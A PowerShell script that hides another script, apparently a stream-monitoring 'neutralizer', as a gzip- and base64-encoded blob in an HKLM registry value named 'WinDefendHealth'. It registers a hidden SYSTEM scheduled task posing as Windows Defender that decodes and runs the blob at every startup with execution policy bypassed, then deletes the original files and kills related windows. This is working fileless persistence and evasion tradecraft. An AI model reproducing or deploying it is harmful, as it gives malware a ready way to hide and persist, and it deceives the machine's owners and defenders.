$ErrorActionPreference = 'Stop'

Write-Host "=== PREPARING STEALTH PAYLOAD ==="
$scriptPath = "d:\OneDrive\Máy tính\PalStatus\StreamGuard\Neutralizer\stream_guard_neutralizer.ps1"
$scriptContent = Get-Content -Path $scriptPath -Raw

# Ensure the script actually runs the protection when loaded in memory
$scriptContent += "`nEnable-AllLayers`nStart-ContinuousMonitor`n"

# 1. Compress and Base64 Encode
Write-Host "Compressing and Encoding..."
$bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$cs.Write($bytes, 0, $bytes.Length)
$cs.Close()
$base64Payload = [Convert]::ToBase64String($ms.ToArray())

# 2. Save to Registry
Write-Host "Injecting to Registry..."
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name "WinDefendHealth" -Value $base64Payload -Type String -Force

# 3. Create Loader Script
$loaderScript = "try{`$p=(Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'WinDefendHealth').WinDefendHealth;`$b=[Convert]::FromBase64String(`$p);`$ms=New-Object IO.MemoryStream(,[byte[]]`$b);`$ds=New-Object IO.Compression.GZipStream(`$ms,[IO.Compression.CompressionMode]::Decompress);`$sr=New-Object IO.StreamReader(`$ds);`$c=`$sr.ReadToEnd();Invoke-Expression -Command `$c}catch{}"
$encodedLoader = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($loaderScript))

# 4. Create Scheduled Task (SYSTEM)
Write-Host "Creating SYSTEM Scheduled Task..."
$taskName = "WinDefend_HealthCheck"
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null

$actionArgs = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $encodedLoader"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $actionArgs
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# Ensure task doesn't kill itself after 3 days (ExecutionTimeLimit 0 = infinite)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 0)

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# 5. Start the stealth task
Write-Host "Starting Stealth Task..."
Start-ScheduledTask -TaskName $taskName
Start-Sleep -Seconds 3

# 6. Cleanup (Self-Destruct original files)
Write-Host "Destroying original files..."
$folder = "d:\OneDrive\Máy tính\PalStatus\StreamGuard\Neutralizer"
Remove-Item -Path "$folder\*.bat" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$folder\*.ps1" -Force -ErrorAction SilentlyContinue

# Kill any existing console windows running the old monitor
Get-Process cmd, powershell -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -match "StreamGuard|Neutralizer" } | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Host "STEALTH DEPLOYMENT SUCCESSFUL!"
